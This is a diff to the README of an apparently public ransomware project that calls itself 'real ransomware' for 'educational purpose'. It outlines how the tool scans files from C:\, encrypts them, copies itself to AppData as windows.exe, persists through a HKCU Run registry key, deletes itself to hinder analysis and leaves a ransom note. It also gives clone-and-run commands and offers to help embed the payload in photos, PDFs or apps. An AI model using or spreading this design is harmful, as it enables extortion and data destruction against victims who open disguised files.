@@ -1,8 +1,8 @@
-*RansomeWare
+# RansomeWare
 "This is a real ransomeware , its code is fully commented not to harm your device and that is for only educational purpose "
 I'm not responsible for the misuse of this ransome 
 
-#explaining the tecneque of the ransome
+# explaining the tecneque of the ransome
 
 first the python script used to scan the files of the device with the extensions of the list put in the script then it returns all the
 pahts of these extensions and you can put the path that you wanna begain from i have selected C:\ and after that taking the result 
@@ -13,14 +13,14 @@ itself after finishing its task to prevent anyone from analysing it
 
 the most advanced method of preventing the ransome from encrypting data many times I copied the path of it to appdata with windows.exe and moved it to the memory of HKCU\Software\Microsoft\Windows\CurrentVersion\Run to make it encrypt all the new files and data every time the device restart and make it impossible to be killed before encrypting itself it makes messge for the user in desktop containg all the details the hacker want from the victim 
 
-**installion 
+# installion 
 if you using linux :- 
 
-git clone https://github.com/enghossamshady/RansomWare.git                                                                         
-cd RansomWare                                                                                                                       
-chmod +x HosRansom.py                                                                                                               
+#git clone https://github.com/enghossamshady/RansomWare.git                                                                         
+#cd RansomWare                                                                                                                     
+#chmod +x HosRansom.py                                                                                                             
 you can edit on it before running it but don't do that on your personal pc                                                         
-./HosRansom.py        
+#./HosRansom.py        
 
 if you wanna merge it on photo or pdf or app please contact me below 
 
